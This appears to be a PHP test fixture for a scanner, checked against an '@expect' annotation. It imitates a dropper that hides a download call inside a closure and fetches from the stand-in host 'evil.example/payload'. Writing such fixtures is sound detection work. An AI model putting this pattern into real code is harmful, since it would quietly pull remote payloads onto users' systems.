<?php
// The URL only reaches the sink through a closure parameter (Laravel-Lang dropper shape).
// @expect: FILE_READ, NETWORK
$fetch = function ($url) {
    return @file_get_contents($url, false);
};
$d = $fetch('https://evil.example/payload');
